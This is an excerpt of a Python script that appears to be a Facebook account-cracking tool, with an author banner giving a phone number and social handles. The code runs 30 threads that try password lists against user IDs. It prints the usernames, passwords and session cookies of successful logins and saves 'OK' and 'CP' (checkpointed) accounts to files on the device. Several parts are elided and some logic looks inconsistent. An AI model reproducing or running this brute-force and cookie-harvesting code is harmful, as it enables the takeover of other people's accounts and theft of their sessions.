...
\x1b[1;96m┏─══─━══─══━─══─| ✠ |─══━─══─══━─══─┓
\x1b[38;5;46m┃AUTHOR    ; ASKAT MRIDHA   ┃
\x1b[1;93m┃WHATSAPP  ; +8801997485700         ┃
\x1b[1;95m┃FACEBOOK  ; ASKAT MRIDHA         ┃
\x1b[1;91m┃GITHUB    ; ASKAT101        ┃
\x1b[1;96m┗─══─━════─━─══─| ✠ |─══━─══─══━─══─┛
...
def Main():
        ...
        os.system('espeak -a 300 "WELCOME TO ASKAT RANDOM TOOLS"')
        print(logo)
...
def fuck():
    ...
    with ThreadPool(max_workers=30) as yaari:
        ...
        for love in user:
            ...
            yaari.submit(askat2,uid,pwx,tl)
    print('•────────────────•°•❀•°•────────────────•')
    print(' [+] Crack process has been completed')
    print(' [+] OK Ids saved in SAMIR/OK.txt')
    print(' [+] CP Ids saved in SAMIR/CP.txt')
    print('•────────────────•°•❀•°•────────────────•')
def askat2(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;92m[ASKAT]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;92m[ASKAT-OK🔥🖤🍎] {uid}|{ps} \nCookie[🍒] : {coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;94m[ASKAT-CP☠️] {uid}|{ps}")
                open('/sdcard/ASKAT-OK.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
